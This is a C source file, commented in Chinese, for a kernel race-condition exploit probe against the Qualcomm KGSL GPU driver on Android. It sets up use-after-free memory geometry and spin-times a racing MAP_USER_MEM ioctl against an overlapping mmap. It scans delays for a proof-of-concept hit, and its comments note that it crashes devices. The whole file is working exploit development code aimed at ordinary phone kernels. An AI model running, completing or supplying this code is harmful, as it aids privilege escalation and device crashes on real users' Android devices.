/*
 * k3_race_scan.c — 阶段 C：精确延时扫描（自旋同步，热路径零 I/O）
 *
 * 前一轮教训：
 *   1. usleep(200) 实际漂移 1.5–3.3 ms；每行日志的 fsync 占 1–3 ms，严重污染时序
 *   2. racer 的 MAP_USER_MEM 实测耗时 0.6–2.0 ms，窗口远宽于预期
 *   3. 同样的代码，主线程 mmap 晚到 → MISS(ENOMEM) 安全；早到/并发 → 设备崩溃
 *
 * 本程序对策：
 *   - 主线程用自旋（CLOCK_MONOTONIC 差值）等待，精度 ~µs
 *   - 竞速热路径只 write(2) 不 fsync；进入竞速前先 fsync 一条基线
 *   - 延时值由 argv 给出，逐个尝试；命中（ENODEV）或崩溃即停止
 *
 * 用法: k3_race_scan [delay_us ...]   缺省 0 50 100 200 400 800
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define PAGE 4096
#define LOGPATH "/data/local/tmp/race_scan.log"

struct kgsl_map_user_mem {
	int fd;
	unsigned long gpuaddr;
	uint64_t len;
	uint64_t offset;
	unsigned long hostptr;
	int memtype;
	unsigned int flags;
};

struct kgsl_gpuobj_alloc {
	uint64_t size;
	uint64_t flags;
	uint64_t va_len;
	uint64_t mmapsize;
	unsigned int id;
	unsigned int metadata_len;
	uint64_t metadata;
};

struct kgsl_gpuobj_free {
	uint64_t flags;
	uint64_t priv;
	unsigned int id;
	unsigned int type;
	unsigned int len;
};

#define IOCTL_KGSL_MAP_USER_MEM \
	_IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
#define IOCTL_KGSL_GPUOBJ_ALLOC \
	_IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE \
	_IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR   0x00000002

#define UAF_START     0x00000007001ff000ULL
#define UAF_SIZE      0x0000000010004000ULL
#define OVERLAP_START 0x00000007001fe000ULL
#define OVERLAP_SIZE  0x0000000000007000ULL
#define PLACEH_START  0x0000000710204000ULL
#define PLACEH_SIZE   0x0000000000010000ULL
#define BOGUS_START   0x0000000700204000ULL
#define WRAP_SIZE     0xffffffffffefd000ULL

static int fd = -1;
static int logfd = -1;

static double now_us(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1e6 + ts.tv_nsec / 1e3;
}

/* 热路径：不 fsync */
static void lg(const char *fmt, ...)
{
	char buf[300], line[360];
	va_list ap;
	int n;
	double t = now_us();

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%12.1f] %s\n", t, buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
}

static void on_alarm(int s)
{
	(void)s;
	lg("WATCHDOG: 90s 超时");
	if (logfd >= 0)
		fsync(logfd);
	_exit(9);
}

struct race_state {
	volatile int ready;
	volatile int started;
	volatile long result;
	volatile int saved_errno;
	double t_enter, t_exit;
	uint64_t hostptr, len;
};

static void *racer(void *arg)
{
	struct race_state *rs = (struct race_state *)arg;
	struct kgsl_map_user_mem req;

	while (!rs->ready)
		__asm__ __volatile__("" ::: "memory");
	rs->started = 1;
	__sync_synchronize();

	memset(&req, 0, sizeof(req));
	req.fd = -1;
	req.len = rs->len;
	req.hostptr = rs->hostptr;
	req.memtype = KGSL_USER_MEM_TYPE_ADDR;
	req.flags = KGSL_MEMFLAGS_USE_CPU_MAP;

	rs->t_enter = now_us();
	errno = 0;
	rs->result = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
	rs->saved_errno = errno;
	rs->t_exit = now_us();
	return NULL;
}

static int obj_alloc(uint64_t size, unsigned int *id, uint64_t *ms)
{
	struct kgsl_gpuobj_alloc al;

	memset(&al, 0, sizeof(al));
	al.size = size;
	al.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &al))
		return -1;
	*id = al.id;
	*ms = al.mmapsize;
	return 0;
}

static int one_attempt(int delay_us, int idx)
{
	unsigned int uaf_id = 0, ov_id = 0, ph_id = 0;
	uint64_t uaf_ms = 0, ov_ms = 0, ph_ms = 0;
	void *p, *bogus, *ph;
	struct race_state rs;
	pthread_t th;
	size_t k;
	int e;
	double t0;

	lg("--- attempt#%d delay=%dus ---", idx, delay_us);

	if (obj_alloc(UAF_SIZE, &uaf_id, &uaf_ms))
		return -1;
	if (obj_alloc(OVERLAP_SIZE, &ov_id, &ov_ms))
		return -1;

	p = mmap((void *)(uintptr_t)UAF_START, (size_t)uaf_ms,
		 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		 (off_t)uaf_id << 12);
	if (p == MAP_FAILED) {
		lg("UAF mmap FAIL errno=%d", errno);
		return -1;
	}
	((volatile char *)p)[0] = 1;
	((volatile char *)p)[uaf_ms - PAGE] = 1;
	for (k = 0; k + PAGE < uaf_ms; k += PAGE * 1024)
		((volatile char *)p)[k] = 1;
	munmap(p, (size_t)uaf_ms);

	bogus = mmap((void *)(uintptr_t)BOGUS_START, PAGE * 3,
		     PROT_READ | PROT_WRITE,
		     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if (bogus == MAP_FAILED) {
		lg("BOGUS mmap FAIL errno=%d", errno);
		return -1;
	}
	for (k = 0; k < 3; k++)
		((volatile char *)bogus)[k * PAGE] = 1;

	if (obj_alloc(PLACEH_SIZE, &ph_id, &ph_ms))
		return -1;
	ph = mmap((void *)(uintptr_t)PLACEH_START, (size_t)ph_ms,
		  PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		  (off_t)ph_id << 12);
	if (ph == MAP_FAILED) {
		lg("PLACEHOLDER mmap FAIL errno=%d", errno);
		return -1;
	}
	((volatile char *)ph)[0] = 1;

	/* 竞速基线落盘，之后热路径不再 fsync */
	lg("geometry ready; 起 racer (delay=%d us)", delay_us);
	if (logfd >= 0)
		fsync(logfd);

	memset(&rs, 0, sizeof(rs));
	rs.hostptr = BOGUS_START;
	rs.len = WRAP_SIZE;
	rs.result = -1;
	if (pthread_create(&th, NULL, racer, &rs)) {
		lg("pthread_create FAIL");
		return -1;
	}
	rs.ready = 1;
	__sync_synchronize();
	while (!rs.started)
		__asm__ __volatile__("" ::: "memory");

	/* 自旋等待，精度 µs 级 */
	t0 = now_us();
	while (now_us() - t0 < (double)delay_us)
		__asm__ __volatile__("" ::: "memory");

	{
		double t_map_in = now_us();
		p = mmap((void *)(uintptr_t)OVERLAP_START, (size_t)ov_ms,
			 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
			 (off_t)ov_id << 12);
		e = errno;
		lg("main mmap t_in=%.1f t_out=%.1f ret=%s errno=%d",
		   t_map_in, now_us(), p == MAP_FAILED ? "FAIL" : "OK", e);
		/* 立刻落盘：即使随后清理阶段崩溃，也保住竞速结果 */
		if (logfd >= 0)
			fsync(logfd);
	}
	pthread_join(th, NULL);
	lg("racer t_enter=%.1f t_exit=%.1f dur=%.0fus ret=%ld errno=%d",
	   rs.t_enter, rs.t_exit, rs.t_exit - rs.t_enter, rs.result,
	   rs.saved_errno);
	lg("overlaps_with_racer=%s",
	   (((double)delay_us) < (rs.t_exit - rs.t_enter)) ? "YES" : "NO");

	if (p != MAP_FAILED) {
		lg(">>> ANOMALY: overlap mmap 成功（正常应为 ENOMEM），停止扫描 <<<");
		if (logfd >= 0)
			fsync(logfd);
		_exit(0);
	} else if (e == ENODEV) {
		lg(">>> ENODEV(19)：PoC 判据，但本机内核 mmap 路径不产生该码 <<<");
		if (logfd >= 0)
			fsync(logfd);
		_exit(0);
	}

	munmap(ph, (size_t)ph_ms);
	munmap(bogus, PAGE * 3);
	{
		struct kgsl_gpuobj_free fr;
		memset(&fr, 0, sizeof(fr));
		fr.id = ov_id;
		ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
		fr.id = ph_id;
		ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
		fr.id = uaf_id;
		ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
	}
	if (logfd >= 0)
		fsync(logfd);
	usleep(200000);
	return e;
}

int main(int argc, char **argv)
{
	int delays[16];
	int n = 0, i, last = -1;

	if (argc > 1) {
		for (i = 1; i < argc && n < 16; i++)
			delays[n++] = atoi(argv[i]);
	} else {
		int d[] = {0, 50, 100, 200, 400, 800};
		for (i = 0; i < 6; i++)
			delays[n++] = d[i];
	}

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	signal(SIGALRM, on_alarm);
	alarm(90);

	lg("===== race_scan start pid=%d n=%d =====", getpid(), n);
	if (logfd >= 0)
		fsync(logfd);

	fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
	if (fd < 0) {
		lg("open FAIL errno=%d", errno);
		return 1;
	}

	for (i = 0; i < n; i++) {
		last = one_attempt(delays[i], i);
		if (last == -1)
			break;
	}
	lg("===== end (last errno=%d) =====", last);
	if (logfd >= 0)
		fsync(logfd);
	close(fd);
	return 0;
}
